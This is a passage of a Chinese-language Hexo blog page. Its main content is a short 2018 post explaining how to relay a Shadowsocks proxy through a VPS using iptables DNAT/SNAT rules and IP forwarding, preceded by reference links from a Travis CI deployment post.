</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blessing.studio/deploy-hexo-blog-automatically-with-travis-ci/" target="_blank" rel="noopener">使用 Travis CI 自动部署 Hexo 博客</a><br><a href="https://segmentfault.com/a/1190000009054888" target="_blank" rel="noopener">使用 Travis 自动部署 Hexo 到 Github 与 自己的服务器</a><br><a href="https://www.karlzhou.com/articles/compress-minify-hexo/" target="_blank" rel="noopener">优化Hexo博客 - 压缩 HTML、CSS、JS、IMG 等</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/315070/using-iptables-to-forward-shadowsocks/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/315070/using-iptables-to-forward-shadowsocks/" itemprop="url">利用iptables实现shadowsocks中继/转发</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-23T14:07:07+08:00">2018-01-23</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">277</span></span></div></header><div class="post-body" itemprop="articleBody"><p>中继的原因是因为一些ip在我们本地的电脑上是无法连通的，但在阿里云等其它VPS上面就可以访问，这样我们可能通过中继来继续使用我们的shadowsocks.</p><h2 id="开启系统的转发功能"><a href="#开启系统的转发功能" class="headerlink" title="开启系统的转发功能"></a>开启系统的转发功能</h2><p> <code>vi /etc/sysctl.conf</code></p><p>将 <code>net.ipv4.ip_forward=0</code> ，修改成 <code>net.ipv4.ip_forward=1</code> 。</p><p>编辑后使用以下命令让配置马上生效</p><p><code>sysctl -p</code></p><h2 id="iptables的命令"><a href="#iptables的命令" class="headerlink" title="iptables的命令"></a>iptables的命令</h2><pre><code><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport [端口号] -j DNAT --to-destination [目标IP]</span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p udp --dport [端口号] -j DNAT --to-destination [目标IP]</span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -p tcp -d [目标IP] --dport [端口号] -j SNAT --to-source [本地服务器公网IP]</span><br><span class="line">iptables -t<span class="built_in"> nat </span>-A POSTROUTING -p udp -d [目标IP] --dport [端口号] -j SNAT --to-source [本地服务器公网IP]</span><br></pre></td></tr></table></figure></code></pre><h2 id="重启iptables使配置生效"><a href="#重启iptables使配置生效" class="headerlink" title="重启iptables使配置生效"></a>重启iptables使配置生效</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h2 id="直接修改iptables文件"><a href="#直接修改iptables文件" class="headerlink" title="直接修改iptables文件"></a>直接修改iptables文件</h2><p>上面添加过后，未来再修改ip的话，可以直接修改文件<code>/etc/sysconfig/iptables</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>sysconfig<span class="regexp">/iptables</span></span><br></pre></td></tr></table></figure><p><code>:%s/1.1.1.1/2.2.2.2</code> 可以替换ip地址</p><p> 然后</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">service iptables restart</span></span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article></section><nav class="pagination"> <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/42/">42</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a></nav></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><section class="site-overview-wrap sidebar-panel sidebar-panel-active"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/logo.png" alt="Ray Chang"><p class="site-author-name" itemprop="name">Ray Chang</p><p class="site-description motion-element" itemprop="description">Think Difficulty</p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">415</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/index.html"><span class="site-state-item-count">10</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">238</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="feed-link motion-element"><a href="/atom.xml" rel="alternate"><i class="fa fa-rss"></i> RSS</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/sbmzhcn" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a href="https://twitter.com/love4026/" target="_blank" title="Twitter"><i class="fa fa-fw fa-twitter"></i> Twitter</a></span><span class="links-of-author-item"><a href="https://plus.google.com/u/0/106618658391372851068" target="_blank" title="Google Plus"><i class="fa fa-fw fa-google"></i> Google Plus</a></span><span class="links-of-author-item"><a href="https://www.facebook.com/love4026" target="_blank" title="Facebook"><i class="fa fa-fw fa-facebook"></i> Facebook</a></span><span class="links-of-author-item"><a href="https://www.v2ex.com/member/sbmzhcn" target="_blank" title="V2EX"><i class="fa fa-fw fa-globe"></i> V2EX</a></span><span class="links-of-author-item"><a href="mailto:love4026@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i> E-Mail</a></span></div><div class="cc-license motion-element" itemprop="license"> <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a></div><div class="links-of-blogroll motion-element links-of-blogroll-inline"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> Links</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"> <a href="http://www.lanthy.com/" title="蓝悉" target="_blank">蓝悉</a></li><li class="links-of-blogroll-item"> <a href="http://www.shibang-china.com/" title="世邦中文" target="_blank">世邦中文</a></li><li class="links-of-blogroll-item"> <a href="http://www.sbmchina.com/" title="世邦英文" target="_blank">世邦英文</a></li><li class="links-of-blogroll-item"> <a href="http://www.kamychina.com/" title="科煤机电" target="_blank">科煤机电</a></li></ul></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">Copyright &copy; <span itemprop="copyrightYear">2018</span><span class="with-love" id="heart"><i class="fa fa-heart"></i></span> <span class="author" itemprop="copyrightHolder">Ray Chang. Allrights reserved.</span></div><div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div> <span class="post-meta-divider">|</span><div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4, modified by Ray Chang.</div><div class="busuanzi-count"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="site-uv"><i class="fa fa-user"></i> 本站访客数<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人次</span><span class="site-pv"><i class="fa fa-eye"></i> 本站总访问量<span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次</span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css"><script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script></body></html>